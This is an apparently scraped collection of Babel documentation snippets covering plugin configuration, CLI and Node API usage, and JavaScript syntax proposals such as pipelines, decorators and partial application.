LANGUAGE: xml
CODE:
<TransformBabel SourceDir="$(MSBuildProjectDirectory)" TargetDir="" />

----------------------------------------

TITLE: Configuring skipForOfIteratorClosing Assumption in JSON
DESCRIPTION: Shows how to configure the skipForOfIteratorClosing assumption in a Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "assumptions": {
    "skipForOfIteratorClosing": true
  }
}

----------------------------------------

TITLE: Node API Usage
DESCRIPTION: How to use the plugin programmatically via Node.js API

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-json-modules"],
});

----------------------------------------

TITLE: Defining Async Generator Function in JavaScript
DESCRIPTION: Demonstrates the syntax for defining an async generator function with the 'async function*' keywords. The function includes an 'await' statement.

LANGUAGE: JavaScript
CODE:
async function* agf() {
  await 1;
}

----------------------------------------

TITLE: Using Babel Plugin via CLI in Shell
DESCRIPTION: Shows how to use the plugin through Babel's command-line interface.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-for-of script.js

----------------------------------------

TITLE: getTargets Function TypeScript Definition
DESCRIPTION: TypeScript type definition for the getTargets function that normalizes compilation targets

LANGUAGE: typescript
CODE:
type GetTargetsOption = {
  configPath?: string;
  configFile?: string;
  browserslistEnv?: string;
  ignoreBrowserslistConfig?: boolean;
};

type InputTargets = {
  ...Targets,
  browsers?: Browsers,
  esmodules?: boolean | "intersect",
};

function getTargets(
  inputTargets: InputTargets = {},
  options: GetTargetsOption = {}
): Targets;

----------------------------------------

TITLE: Transforming React Components with Constant Elements in JSX
DESCRIPTION: This snippet demonstrates how the plugin transforms React components by hoisting constant elements. It shows the input JSX code and the resulting output after transformation.

LANGUAGE: jsx
CODE:
const Hr = () => {
  return <hr className="hr" />;
};

const WithChildren = (props) => {
  return <div className={props.className}>
    <hr />
  </div>;
}

LANGUAGE: jsx
CODE:
var _hr, _hr2;

const Hr = () => {
  return _hr || (_hr = <hr className="hr" />);
};

const WithChildren = (props) => {
  return <div className={props.className}>
    {_hr2 || (_hr2 = <hr />)}
  </div>;
}

----------------------------------------

TITLE: Applying Async Generators Syntax Plugin via Babel Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use the @babel/plugin-syntax-async-generators plugin programmatically with Babel's Node API for code transformation.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-async-generators"]
});

----------------------------------------

TITLE: Using ES7 Property Initializers for React Component Properties
DESCRIPTION: Demonstrates how to use ES7 property initializers to define defaultProps, propTypes, and initial state in a React component class.

LANGUAGE: JavaScript
CODE:
// The ES5 way
var Video = React.createClass({
  getDefaultProps: function() {
    return {
      autoPlay: false,
      maxLoops: 10,
    };
  },
  getInitialState: function() {
    return {
      loopsRemaining: this.props.maxLoops,
    };
  },
  propTypes: {
    autoPlay: React.PropTypes.bool.isRequired,
    maxLoops: React.PropTypes.number.isRequired,
    posterFrameSrc: React.PropTypes.string.isRequired,
    videoSrc: React.PropTypes.string.isRequired,
  },
});

LANGUAGE: JavaScript
CODE:
// The ES6+ way
class Video extends React.Component {
  static defaultProps = {
    autoPlay: false,
    maxLoops: 10,
  }
  static propTypes = {
    autoPlay: React.PropTypes.bool.isRequired,
    maxLoops: React.PropTypes.number.isRequired,
    posterFrameSrc: React.PropTypes.string.isRequired,
    videoSrc: React.PropTypes.string.isRequired,
  }
  state = {
    loopsRemaining: this.props.maxLoops,
  }
}

----------------------------------------

TITLE: Adding Namespace Import
DESCRIPTION: Shows how to add a namespace import using addNamespace function.

LANGUAGE: javascript
CODE:
import { addNamespace } from "@babel/helper-module-imports";
addNamespace(path, 'source');

----------------------------------------

TITLE: Using babel-plugin-minify-builtins via Babel CLI
DESCRIPTION: Shows the command to use the minify-builtins plugin with Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins minify-builtins script.js

----------------------------------------

TITLE: Plugin Usage via Node API
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-async-generator-functions"],
});

----------------------------------------

TITLE: Plugin Configuration with Built-ins Option
DESCRIPTION: Example configuration using the useBuiltIns option to utilize Object.assign directly.

LANGUAGE: json
CODE:
{
  "plugins": [
    ["@babel/plugin-transform-destructuring", { "useBuiltIns": true }]
  ]
}

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line usage of the arrow functions transform plugin.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-arrow-functions script.js

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line usage of the TypeScript transform plugin

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-typescript script.js

----------------------------------------

TITLE: Configuring Webpack Babel Loader with rootMode
DESCRIPTION: Webpack configuration snippet to set Babel loader's rootMode to 'upward' for monorepo setups.

LANGUAGE: javascript
CODE:
module: {\n  rules: [\n    {\n      loader: "babel-loader",\n      options: {\n        rootMode: "upward",\n      },\n    },\n  ];\n}

----------------------------------------

TITLE: Example Input Code with Debugger Statement
DESCRIPTION: Sample JavaScript code showing a debugger statement that will be removed by the plugin.

LANGUAGE: javascript
CODE:
debugger;

----------------------------------------

TITLE: Configuring Babel for Async Do Expressions
DESCRIPTION: This JSON configuration enables the async do expressions plugin in Babel. It also shows how to include the async-to-generator plugin for older engine support.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-proposal-async-do-expressions"]
}

LANGUAGE: JSON
CODE:
{
  "plugins": [
    "@babel/plugin-proposal-async-do-expressions",
    "@babel/plugin-transform-async-to-generator"
  ]
}

----------------------------------------

TITLE: Basic Babelify Node.js API Integration
DESCRIPTION: Simple example of using Babelify transform with Browserify in Node.js code

LANGUAGE: javascript
CODE:
browserify({ debug: true })
  .transform(babelify);

----------------------------------------

TITLE: Configuring Plugin in Babel Config
DESCRIPTION: JSON configuration to enable the plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-instanceof"]
}

----------------------------------------

TITLE: Using Babel JSON Strings Transform via CLI
DESCRIPTION: Demonstrates how to use the plugin through Babel's command-line interface.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-json-strings script.js

----------------------------------------

TITLE: Configuring Babel Plugin with 'loose' Option (JSON)
DESCRIPTION: JSON configuration to enable the plugin with the 'loose' option set to true, which affects how private properties are transformed.

LANGUAGE: JSON
CODE:
{
  "assumptions": {
    "privateFieldsAsProperties": true,
    "setPublicClassFields": true
  }
}

----------------------------------------

TITLE: Configuring Babel to use object rest/spread syntax plugin
DESCRIPTION: JSON configuration for babel.config.json to enable the @babel/plugin-syntax-object-rest-spread plugin. This allows Babel to parse object rest/spread syntax.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-object-rest-spread"]
}

----------------------------------------

TITLE: Configuring Babel to Use Object Rest/Spread Transform Plugin
DESCRIPTION: This JSON configuration adds the object rest/spread transform plugin to Babel's plugin list.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-object-rest-spread"]
}

----------------------------------------

TITLE: Using Destructuring and Spread Attributes in React Components
DESCRIPTION: Shows how to use ES6 destructuring and JSX spread attributes to pass props from a parent component to a child component, excluding specific props.

LANGUAGE: JavaScript
CODE:
class AutoloadingPostsGrid extends React.Component {
  render() {
    const {
      className,
      ...others  // contains all properties of this.props except for className
    } = this.props;
    return (
      <div className={className}>
        <PostsGrid {...others} />
        <button onClick={this.handleLoadMoreClick}>Load more</button>
      </div>
    );
  }
}

----------------------------------------

TITLE: Adding Default Import
DESCRIPTION: Shows how to add a default import using addDefault function.

LANGUAGE: javascript
CODE:
import { addDefault } from "@babel/helper-module-imports";
addDefault(path, 'source');

----------------------------------------

TITLE: Plugin Configuration Examples
DESCRIPTION: Shows how to configure the plugin in Babel configuration files, both with and without options.

LANGUAGE: javascript
CODE:
// without options
{
  "plugins": ["@babel/plugin-transform-modules-commonjs"]
}

// with options
{
  "plugins": [
    ["@babel/plugin-transform-modules-commonjs", {
      "allowTopLevelThis": true
    }]
  ]
}

----------------------------------------

TITLE: Configuring Babel Spread Plugin With Options
DESCRIPTION: Advanced configuration for the spread transform plugin with the loose mode option enabled.

LANGUAGE: json
CODE:
{
  "plugins": [
    [
      "@babel/plugin-transform-spread",
      {
        "loose": true
      }
    ]
  ]
}

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Shows how to use the plugin via Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins transform-node-env-inline script.js

----------------------------------------

TITLE: Babel Configuration - JSON
DESCRIPTION: Configuration setup in babel.config.json to enable the unicode-escapes transform plugin.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-unicode-escapes"]
}

----------------------------------------

TITLE: Configuring babel-plugin-transform-inline-environment-variables in JSON
DESCRIPTION: Demonstrates how to configure the plugin in a Babel configuration file, both with and without options. The 'include' option allows specifying which environment variables to transform.

LANGUAGE: JSON
CODE:
// without options
{
  "plugins": ["transform-inline-environment-variables"]
}

// with options
{
  "plugins": [
    ["transform-inline-environment-variables", {
      "include": [
        "NODE_ENV"
      ]
    }]
  ]
}

----------------------------------------

TITLE: Installing Babel Safari Class Field Initializer Scope Bugfix Plugin via npm
DESCRIPTION: Command to install the @babel/plugin-bugfix-safari-class-field-initializer-scope plugin using npm or yarn.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-bugfix-safari-class-field-initializer-scope

----------------------------------------

TITLE: Running babel-node-debug with a script file
DESCRIPTION: This command runs the babel-node-debug debugger on a specified script file. It allows debugging of Babel-transpiled Node.js code.

LANGUAGE: sh
CODE:
babel-node-debug path/to/script.js

----------------------------------------

TITLE: Babel Plugin Configuration
DESCRIPTION: Shows how to configure the Flow comments transform plugin in babel.config.json

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-flow-comments"]
}

----------------------------------------

TITLE: Applying transform-minify-booleans Plugin via Node.js API
DESCRIPTION: Demonstrates how to use the plugin programmatically with Babel's Node.js API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["transform-minify-booleans"],
});

----------------------------------------

TITLE: Configuring babel-plugin-minify-guarded-expressions in babel.config.json
DESCRIPTION: This JSON configuration adds the minify-guarded-expressions plugin to the Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["minify-guarded-expressions"]
}

----------------------------------------

TITLE: Node API Usage with Flow Preset
DESCRIPTION: Example showing how to use the Flow preset programmatically via Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  presets: ["@babel/preset-flow"],
});

----------------------------------------

TITLE: Using babel-plugin-minify-guarded-expressions via CLI
DESCRIPTION: This shell command demonstrates how to use the plugin with Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins minify-guarded-expressions script.js

----------------------------------------

TITLE: Using Strict Mode Transform Plugin via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-strict-mode plugin with Babel's command-line interface to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-strict-mode script.js

----------------------------------------

TITLE: New Decorator Syntax Example
DESCRIPTION: Shows the new decorator proposal syntax that only allows dot property access and function calls

LANGUAGE: javascript
CODE:
class MyClass {
  @decorator
  @dec(arg1, arg2)
  @namespace.decorator
  @(complex ? dec1 : dec2)
  method() {}
}

----------------------------------------

TITLE: Using V8 Intrinsic Runtime Functions
DESCRIPTION: Example of using V8 intrinsic functions for debugging and testing. Shows how to check optimization status of a function using the special % syntax supported by V8 engine.

LANGUAGE: JavaScript
CODE:
function fn() { /* ... */ }

const status = %GetOptimizationStatus(fn);

if (status === 2) {
  console.log("The function is not optimized!");
}

----------------------------------------

TITLE: Using @babel/plugin-proposal-function-sent via Babel CLI
DESCRIPTION: Command to use the @babel/plugin-proposal-function-sent plugin with Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-proposal-function-sent script.js

----------------------------------------

TITLE: Configuring Babel Assumptions for Spread Properties
DESCRIPTION: This JSON configuration enables the setSpreadProperties assumption in Babel, which affects how spread properties are transformed.

LANGUAGE: JSON
CODE:
{
  "assumptions": {
    "setSpreadProperties": true
  }
}

----------------------------------------

TITLE: Node API Usage
DESCRIPTION: Example of using the plugin programmatically via the Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-block-scoping"],
});

----------------------------------------

TITLE: Configuring Babel ES2015 Preset
DESCRIPTION: JSON configuration for enabling @babel/preset-es2015 in babel.config.json file.

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-es2015"]
}

----------------------------------------

TITLE: Deprecated Assert Syntax Example
DESCRIPTION: Example of the deprecated 'assert' keyword syntax for import attributes, supported in V8-based engines.

LANGUAGE: javascript
CODE:
import foo from "./foo.json" assert { type: "json" };

----------------------------------------

TITLE: Configuring Babel JSON Strings Transform Plugin
DESCRIPTION: Shows how to configure the plugin in a Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-json-strings"]
}

----------------------------------------

TITLE: Configuring @babel/plugin-transform-runtime in Babel Config
DESCRIPTION: JSON configuration for enabling @babel/plugin-transform-runtime in Babel, with and without options specified.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-runtime"]
}

LANGUAGE: json
CODE:
{
  "plugins": [
    [
      "@babel/plugin-transform-runtime",
      {
        "absoluteRuntime": false,
        "corejs": false,
        "helpers": true,
        "regenerator": true,
        "version": "7.0.0-beta.0"
      }
    ]
  ]
}

----------------------------------------

TITLE: Applying @babel/plugin-transform-unicode-property-regex via Node.js API
DESCRIPTION: JavaScript code to use the Unicode property regex transform plugin with Babel's Node.js API.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync(code, {
  plugins: ["@babel/plugin-transform-unicode-property-regex"],
});

----------------------------------------

TITLE: Direct AST Template Usage
DESCRIPTION: Using template.ast for direct string to AST parsing without placeholders

LANGUAGE: javascript
CODE:
const ast = template.ast(`
  var myModule = require("my-module");
`);

----------------------------------------

TITLE: Babel Pipeline Operator Configuration
DESCRIPTION: Configuration example for enabling Hack-style pipeline operator support in Babel.

LANGUAGE: json
CODE:
{
  "plugins": [
    ["@babel/plugin-proposal-pipeline-operator", {
      "proposal": "hack",
      "topicToken": "#"
    }]
  ]
}

----------------------------------------

TITLE: Installing Babel JSON Strings Transform Plugin
DESCRIPTION: Shows the npm command to install the plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-json-strings

----------------------------------------

TITLE: Installing @babel/plugin-transform-parameters via npm
DESCRIPTION: This command installs the @babel/plugin-transform-parameters plugin as a dev dependency using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-parameters

----------------------------------------

TITLE: Package.json Dependencies Update
DESCRIPTION: Shows how package.json should look after installing Babel dependencies

LANGUAGE: diff
CODE:
{
  "devDependencies": {
+   "@babel/cli": "^7.0.0",
+   "@babel/core": "^7.0.0"
  }
}

----------------------------------------

TITLE: Node API Usage Example
DESCRIPTION: JavaScript code showing how to use the plugin programmatically via the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-react-jsx-development"],
});

----------------------------------------

TITLE: TypeScript function signature for isIdentifierName
DESCRIPTION: This TypeScript function signature describes the isIdentifierName function, which checks if a given string is a valid identifier name.

LANGUAGE: typescript
CODE:
function isIdentifierName(name: string): boolean

----------------------------------------

TITLE: Pipeline Operator with Partial Application
DESCRIPTION: Example showing how F# pipelines can be used together with the partial application proposal using the ? placeholder.

LANGUAGE: javascript
CODE:
let newScore = person.score
  |> double
  |> add(7, ?)
  |> boundScore(0, 100, ?);

----------------------------------------

TITLE: Applying babel-plugin-minify-constant-folding via Node API
DESCRIPTION: This JavaScript code snippet shows how to use the minify-constant-folding plugin programmatically with Babel's Node API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["minify-constant-folding"]
});

----------------------------------------

TITLE: Template Literal AST Direct Usage
DESCRIPTION: Using template.ast with template literals for direct AST generation

LANGUAGE: javascript
CODE:
const name = "my-module";
const mod = "myModule";

const ast = template.ast`
  var ${mod} = require("${name}");
`;

----------------------------------------

TITLE: Using Plugin via CLI - Shell
DESCRIPTION: Command line usage of the plugin to transform JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-literals script.js

----------------------------------------

TITLE: Using the Babel Plugin via Node API in JavaScript
DESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-transform-unicode-sets-regex plugin with Babel's Node API in a JavaScript environment.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-unicode-sets-regex"],
});

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line usage of the plugin

LANGUAGE: shell
CODE:
babel --plugins=@babel/plugin-transform-json-modules script.js

----------------------------------------

TITLE: Using Babel plugin via CLI
DESCRIPTION: Shell command to use the @babel/plugin-syntax-destructuring-private plugin with Babel CLI for transforming a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-destructuring-private script.js

----------------------------------------

TITLE: Implementing Babel Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the async do expressions syntax plugin programmatically through the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-async-do-expressions"],
});

----------------------------------------

TITLE: Decimal Literal in JavaScript
DESCRIPTION: Example of the new decimal literal syntax from the Stage 1 Decimal proposal, now supported by Babel's parser.

LANGUAGE: JavaScript
CODE:
0.1m + 0.2m === 0.3m; // true

----------------------------------------

TITLE: Adding Side Effect Import
DESCRIPTION: Demonstrates how to add a side effect import statement using addSideEffect function.

LANGUAGE: javascript
CODE:
import { addSideEffect } from "@babel/helper-module-imports";
addSideEffect(path, 'source');

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the babel-plugin-transform-remove-debugger package as a development dependency.

LANGUAGE: shell
CODE:
npm install babel-plugin-transform-remove-debugger --save-dev

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: JSON configuration for enabling the plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-explicit-resource-management"]
}

----------------------------------------

TITLE: Installing Babel Polyfill
DESCRIPTION: Command to install @babel/polyfill as a project dependency using npm.

LANGUAGE: shell
CODE:
npm install --save @babel/polyfill

----------------------------------------

TITLE: Installing babel-minify via npm/yarn
DESCRIPTION: Command to install babel-minify as a development dependency using npm or yarn.

LANGUAGE: shell
CODE:
npm install babel-minify --save-dev

----------------------------------------

TITLE: Applying babel-plugin-transform-remove-undefined via Node.js API
DESCRIPTION: This JavaScript code snippet shows how to use the babel-plugin-transform-remove-undefined plugin programmatically with the Babel Node.js API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["babel-plugin-transform-remove-undefined"],
});

----------------------------------------

TITLE: Configuring Babel to Use Async Generators Syntax Plugin
DESCRIPTION: JSON configuration for Babel to enable the @babel/plugin-syntax-async-generators plugin in the project's babel.config.json file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-syntax-async-generators"]
}

----------------------------------------

TITLE: Await Handling in Pipeline Variants
DESCRIPTION: Comparison of how await operations are handled in different pipeline operator variants when dealing with async operations.

LANGUAGE: javascript
CODE:
let id = (
  await (
    await fetch(url)
  ).json()
).ID;

LANGUAGE: javascript
CODE:
let newScore = fetch(url)
  |> await
  |> r => r.json()
  |> await
  |> obj => obj.ID;

LANGUAGE: javascript
CODE:
let newScore = fetch(url)
  |> await #
  |> #.json()
  |> await #
  |> #.ID;

----------------------------------------

TITLE: Installing babel-plugin-minify-guarded-expressions via npm
DESCRIPTION: This command installs the babel-plugin-minify-guarded-expressions as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install babel-plugin-minify-guarded-expressions --save-dev

----------------------------------------

TITLE: Applying class properties syntax plugin using Babel Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use the @babel/plugin-syntax-class-properties plugin with Babel's Node API for code transformation.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-class-properties"]
});

----------------------------------------

TITLE: Removing Super from Expression Alias in Babel 8
DESCRIPTION: In Babel 8, the Super node type is removed from the Expression alias. This affects type checking for expressions.

LANGUAGE: javascript
CODE:
// Add `.foo` to an expression
- if (t.isExpression(path.node)) {
+ if (t.isExpression(path.node) || t.isSuper(path.node)) {
  path.replaceWith(
    t.memberExpression(
      path.node,
      t.identifier("foo")
    ))
}

----------------------------------------

TITLE: Legacy Object Decorators Example
DESCRIPTION: Shows the removed object member decorators syntax from the old proposal

LANGUAGE: javascript
CODE:
const myObj = {
  @dec1 foo: 3,
  @dec2 bar() {},
};

----------------------------------------

TITLE: Closure Example
DESCRIPTION: Example demonstrating a case where closure is required for proper block-scoping transformation.

LANGUAGE: javascript
CODE:
for (let i = 0; i < 5; i++) {
  setTimeout(() => console.log(i), 1);
}

----------------------------------------

TITLE: Browser Transform Output
DESCRIPTION: Generated code for browser environments using fetch API

LANGUAGE: javascript
CODE:
const data = await fetch(import.meta.resolve("./data.json")).then(r => r.json());

----------------------------------------

TITLE: Using Babel Plugin via CLI
DESCRIPTION: Command line usage of the partial application syntax plugin with the Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-partial-application script.js

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: JSON configuration to enable the plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-react-inline-elements"]
}

----------------------------------------

TITLE: Node.js ESM Transform Output
DESCRIPTION: Generated code for Node.js ESM environment using fs.readFileSync

LANGUAGE: javascript
CODE:
import { readFileSync as _readFileSync } from "fs";
const data = JSON.parse(_readFileSync(new URL(import.meta.resolve("./data.json"))));

----------------------------------------

TITLE: Demonstrating F# Pipeline Proposal in JavaScript
DESCRIPTION: This snippet illustrates the F# Pipeline proposal in JavaScript. It shows how arrow functions are used instead of placeholders, and demonstrates chaining multiple operations including doubling, adding, and bounding a score.

LANGUAGE: javascript
CODE:
let person = { score: 25 };

let newScore = person.score
  |> double
  |> (_ => add(7, _))
  |> (_ => boundScore(0, 100, _));

----------------------------------------

TITLE: Unsupported Destructuring Pattern in JavaScript
DESCRIPTION: Example of a destructuring pattern that is not handled by this helper, demonstrating the limitations of the transformation capabilities.

LANGUAGE: javascript
CODE:
{ a } = foo;

----------------------------------------

TITLE: Using babel-plugin-transform-remove-undefined via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the babel-plugin-transform-remove-undefined plugin with the Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins babel-plugin-transform-remove-undefined script.js

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line interface command to run the transform-merge-sibling-variables plugin on a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins transform-merge-sibling-variables script.js

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the dead code elimination plugin as a development dependency

LANGUAGE: shell
CODE:
npm install babel-plugin-minify-dead-code-elimination --save-dev

----------------------------------------

TITLE: Configuring Babel Plugin in JSON
DESCRIPTION: JSON configuration for enabling the minify-flip-comparisons plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["minify-flip-comparisons"]
}

----------------------------------------

TITLE: TypeScript Namespace Support Example
DESCRIPTION: Example of experimental TypeScript namespace support showing class and regexp definitions within a namespace.

LANGUAGE: javascript
CODE:
namespace Validation {
  const lettersRegexp = /^[A-Za-z]+$/;
  const numberRegexp = /^[0-9]+$/;

  export class LettersOnlyValidator {
    isAcceptable(s: string) {
      return lettersRegexp.test(s);
    }
  }
}

----------------------------------------

TITLE: Installing babel-plugin-minify-simplify via npm
DESCRIPTION: Provides the command to install the babel-plugin-minify-simplify package using npm as a development dependency.

LANGUAGE: Shell
CODE:
npm install babel-plugin-minify-simplify --save-dev

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the private methods transform plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install @babel/plugin-transform-private-methods --save-dev

----------------------------------------

TITLE: Plugin Configuration with Options
DESCRIPTION: JSON configuration showing how to enable loose mode for the plugin.

LANGUAGE: json
CODE:
{
  "plugins": [
    [
      "@babel/plugin-transform-computed-properties",
      {
        "loose": true
      }
    ]
  ]
}

----------------------------------------

TITLE: TypeScript Import and Export Syntax
DESCRIPTION: Shows the TypeScript-specific import and export syntax for CommonJS modules when using verbatimModuleSyntax.

LANGUAGE: TypeScript
CODE:
import A = require("./a");

export = { x: 2 };

----------------------------------------

TITLE: Using Babel Sticky Regex Plugin via CLI
DESCRIPTION: Command line interface usage for transforming code with the sticky regex plugin.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-sticky-regex script.js

----------------------------------------

TITLE: Using Babel Function Bind Plugin via CLI
DESCRIPTION: Command line instruction for using the function bind syntax plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-function-bind script.js

----------------------------------------

TITLE: Creating an ArgumentPlaceholder Node
DESCRIPTION: Example of creating an ArgumentPlaceholder node using the t.argumentPlaceholder() builder function.

LANGUAGE: JavaScript
CODE:
t.argumentPlaceholder();

----------------------------------------

TITLE: Flow Preset Configuration
DESCRIPTION: Shows how to configure Babel to use the new Flow preset for stripping Flow types.

LANGUAGE: json
CODE:
{
  "presets": ["flow"]
}

----------------------------------------

TITLE: Node.js API Integration
DESCRIPTION: JavaScript code showing how to use the plugin programmatically via the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["transform-remove-debugger"],
});

----------------------------------------

TITLE: Configuring Babel Plugin in Configuration File
DESCRIPTION: JSON configuration to enable the shorthand properties transform plugin in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-shorthand-properties"]
}

----------------------------------------

TITLE: Using import-defer plugin via Babel CLI
DESCRIPTION: Shows how to use the import-defer plugin along with the CommonJS module transform plugin via the Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins=@babel/plugin-proposal-import-defer,@babel/plugin-transform-modules-commonjs script.js

----------------------------------------

TITLE: Using syntax-import-defer plugin via Babel CLI
DESCRIPTION: Command-line instruction to use the @babel/plugin-syntax-import-defer plugin with Babel CLI for transforming a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-import-defer script.js

----------------------------------------

TITLE: Configuring Babel Export Namespace Plugin in Config File
DESCRIPTION: JSON configuration to enable the export namespace syntax plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-export-namespace-from"]
}

----------------------------------------

TITLE: Configuring Babel Plugin in JSON
DESCRIPTION: Demonstrates how to include the named capturing groups plugin in a Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-named-capturing-groups-regex"]
}

----------------------------------------

TITLE: Configuring Babel to use @babel/plugin-syntax-bigint
DESCRIPTION: This JSON configuration adds the @babel/plugin-syntax-bigint plugin to the Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-bigint"]
}

----------------------------------------

TITLE: Using partial application syntax
DESCRIPTION: Examples of the new partial application syntax for function arguments and this binding. This allows partially applying arguments to functions.

LANGUAGE: JavaScript
CODE:
const half = divide(?, 2); // half = num => divide(num, 3)
half(6); // 3

element.addEventListener(
  "click",
  // handleEvent will be called with the correct "this".
  this.handleEvent("click", ?) // e => this.handleEvent("click", e)
);

----------------------------------------

TITLE: Configuring babel-plugin-minify-simplify in babel.config.json
DESCRIPTION: Shows how to add the minify-simplify plugin to the Babel configuration file, which is the recommended method for using the plugin.

LANGUAGE: JSON
CODE:
{
  "plugins": ["minify-simplify"]
}

----------------------------------------

TITLE: Flow Declare Fields Example
DESCRIPTION: Shows how to use the new Flow declare modifier for class fields to indicate type-only fields that should be removed during compilation.

LANGUAGE: javascript
CODE:
class Foo {
  x: ?string; // A "real" field
  declare y: number; // A type-only field
}

----------------------------------------

TITLE: Node API Integration
DESCRIPTION: Shows how to use the plugin programmatically via Node.js API

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-flow-comments"],
});

----------------------------------------

TITLE: Applying @babel/preset-stage-3 using Babel Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use @babel/preset-stage-3 when transforming code with the Babel Node API.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  presets: ["@babel/preset-stage-3"]
});

----------------------------------------

TITLE: Configuring Babel for String Names in Imports/Exports
DESCRIPTION: This JSON snippet demonstrates how to configure Babel to enable parsing support for string names in imports and exports using the module-string-names plugin.

LANGUAGE: json
CODE:
{
  "presets:" ["@babel/preset-env"],
  "plugins": [
    "@babel/syntax-module-string-names"
  ]
}

----------------------------------------

TITLE: Transforming Member Expression Literals Example
DESCRIPTION: Demonstrates how the plugin transforms member expressions that use reserved keywords as property names from dot notation to bracket notation.

LANGUAGE: javascript
CODE:
obj.foo = "isValid";

obj.const = "isKeyword";
obj["var"] = "isKeyword";

LANGUAGE: javascript
CODE:
obj.foo = "isValid";

obj["const"] = "isKeyword";
obj["var"] = "isKeyword";

----------------------------------------

TITLE: Using Babel Spread Plugin via CLI
